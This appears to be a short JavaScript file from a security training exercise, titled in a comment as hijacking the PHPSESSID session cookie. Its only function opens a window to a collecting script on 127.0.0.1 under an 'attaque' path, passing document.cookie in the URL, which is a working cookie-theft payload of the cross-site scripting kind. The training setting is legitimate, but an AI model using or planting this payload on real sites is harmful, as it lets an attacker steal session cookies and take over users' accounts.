/*
* hacker PHPSESSID via CSS
*/
function window_css(){
window.open('http://127.0.0.1/formation.session/attaque/csrf_3.php?hackCookie='+document.cookie,"", "width=200, height=100");
}